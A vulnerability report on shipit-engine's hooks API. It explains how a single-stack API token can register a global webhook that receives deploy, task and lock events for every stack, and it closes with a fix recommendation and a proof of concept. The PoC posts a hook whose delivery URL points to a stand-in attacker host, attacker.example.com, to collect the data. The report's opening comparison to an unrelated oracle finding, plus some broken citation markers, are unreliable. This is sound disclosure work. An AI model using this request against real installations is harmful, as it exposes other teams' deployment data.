### Title
Stack-scoped API token can create/manage global webhooks that receive events from every stack - ([File: app/controllers/shipit/api/hooks_controller.rb])

### Summary
The `H-2` report describes a broken binding where a value derived from an *unauthenticated/unenforced* source (an expired oracle version treated as the previous "valid" version) is used as if it carried the authorization/validity of the value it is supposed to represent. The equivalent binding-break in shipit-engine is between the **stack an `ApiClient` token is authorized for** (`ApiClient#stack_id`) and the **stack(s) a hook it creates actually touches**. `Shipit::Api::HooksController` never checks the requesting client's `stack_id` scope when the `stack_id` route param is absent, letting a stack-scoped, `write:hook`-permissioned token create a *global* hook (`stack_id: nil`) that receives delivery events for **every** stack in the installation, not just the one it was scoped to.

### Finding Description
`ApiClient` tokens can be scoped to a single stack via `stack_id` [1](#0-0) , and `Api::BaseController#stacks` is supposed to enforce this scope: `current_api_client.stack_id? ? Stack.where(id: current_api_client.stack_id) : Stack.all` [2](#0-1) .

However, `Api::HooksController` computes the hooks scope independently, using only the URL param, not the client's authorized stack:
```ruby
def hooks
  Hook.where(stack_id:)
end

def stack_id
  stack.id if params[:stack_id].present?
end
``` [3](#0-2) 

When a request is made to the top-level, non-nested route `POST /api/hooks` (defined alongside the stack-nested one in `config/routes.rb` [4](#0-3) ), `params[:stack_id]` is absent, so `stack_id` returns `nil`, and `hooks` becomes `Hook.where(stack_id: nil)`. Calling `hooks.create(params)` on that scoped relation persists a hook with `stack_id: nil`, i.e., a **global hook** [5](#0-4) .

The only authorization check performed is the *operation-level* permission `write:hook` via `require_permission` [6](#0-5) , which is checked with `current_api_client.check_permissions!(operation, scope)` [7](#0-6) . This check is entirely independent of `stack_id` — there is no `write:hook:<stack>` distinction. So a token created with `stack_id` set to Stack A and permission `write:hook` (intended, per the API's own scoping model demonstrated in `BaseController#stacks`, to only manage things for Stack A) can create a hook with `stack_id: nil`.

Global hooks are delivered on **every** stack's events, since `Hook.deliver` uses `for_stack(stack_id)`, whose scope is `where(stack_id: [nil, stack_id])` [8](#0-7)  and `95` — i.e. `nil`-scoped hooks match every stack's event stream. This is confirmed by `Hook.for_stack` combined with `Hook.deliver` [9](#0-8) , and by the existing test asserting `#index without a stack_id returns the list of global hooks` [10](#0-9) .

**Binding broken (equality that should hold but doesn't):**
`stack_id` the `ApiClient` token is authorized for == `stack_id` of the `Hook` records it can create/update/destroy and the stacks whose events that hook receives.

Before the request: a token scoped to Stack A can only read/write Stack A's resources through endpoints that call `stack`/`stacks` (e.g. `Api::StacksController`, `Api::DeploysController`).
After hitting `POST /api/hooks` (or `PATCH/DELETE /api/hooks/:id` for an existing global hook, if `write:hook` is granted): the same token can create, update, or delete a hook whose `stack_id` is `nil`, which is delivered on deploy/rollback/task/lock/commit_status/merge events for **all** stacks, including ones the token was never authorized to touch.

### Impact Explanation
This crosses the "unauthenticated read of stack state, task streams or deploy output" bar for High severity: an attacker holding only a single-stack-scoped API token (e.g., a low-privilege CI integration for one team's stack) can register a hook delivery URL they control and receive JSON payloads (`Hook.coerce_payload`) describing deploy status, commit info, lock reasons, and task/deploy state for every stack in the Shipit instance — not just their own. It also lets that token tamper with (update/delete) any pre-existing global hook if `write:hook` permission is granted, which is an unauthorized cross-stack write. This directly breaks the intended per-stack API token confinement, which is a core authorization guarantee of the engine's multi-tenant API model (see `Api::BaseController#stacks`).

### Likelihood Explanation
Any tenant/team that has been issued a stack-scoped `ApiClient` with `write:hook` (a normal permission for automation integrations, per `Api::HooksController` and the seeded fixtures showing scoped clients such as `here_come_the_walrus` [11](#0-10) ) can trigger this by simply calling the unscoped route `POST /api/hooks` instead of the nested `/api/stacks/:stack_id/hooks` route — no special access beyond their existing, ordinarily-issued token is required, and the request requires no additional privilege escalation.

### Recommendation
In `Api::HooksController`, tie the hook's stack scope to the authenticated `current_api_client`'s authorization, not solely to the request URL param:
- Reject (403/404) requests to the global `/api/hooks` collection when `current_api_client.stack_id?` is true.
- When `params[:stack_id]` is present, verify it matches `current_api_client.stack_id` (or that the client is unscoped) before resolving `stack`.
- Consider scoping the `hooks` relation through `Api::BaseController#stacks`/`stack` (which already enforces `current_api_client.stack_id`) rather than through an independently-computed `stack_id`.

### Proof of Concept
1. Create an `ApiClient` scoped to Stack A with permission `write:hook` (mirrors fixture `here_come_the_walrus`, but grant `write:hook` instead of/along with `read:stack`).
2. Authenticate as that client and issue:
   ```
   POST /api/hooks
   { "delivery_url": "https://attacker.example.com/collect", "events": ["deploy", "rollback", "task"] }
   ```
   (Note: no `stack_id` in the path — this is the top-level route from `config/routes.rb`.) [12](#0-11) 
3. `Api::HooksController#hooks` resolves to `Hook.where(stack_id: nil)` because `params[:stack_id]` is absent [13](#0-12) , so the created hook has `stack_id: nil`.
4. Any deploy/rollback/task/lock event on **any** stack in the installation now triggers `Hook.deliver` matching this hook via `for_stack(stack_id) == where(stack_id: [nil, stack_id])` [14](#0-13) , sending that stack's event payload to the attacker-controlled `delivery_url`, even though the originating `ApiClient` token was only ever authorized for Stack A.

    class << self
      def emit(event, stack, payload)
        raise "#{event} is not declared in Shipit::Hook::EVENTS" unless EVENTS.include?(event.to_s)

        Shipit::EmitEventJob.perform_later(
          event: event.to_s,
          stack_id: stack&.id,
          payload: coerce_payload(payload)
        )
        deliver_internal_hooks(event, stack, payload)
      end

      def deliver_internal_hooks(event, stack, payload)
        Shipit.internal_hook_receivers.each do |receiver|
          receiver.deliver(event, stack, payload)
        end
      end

      def deliver(event, stack_id, payload)
        for_stack(stack_id).listening_event(event).each do |hook|
          hook.deliver!(event, payload)
        end
      end
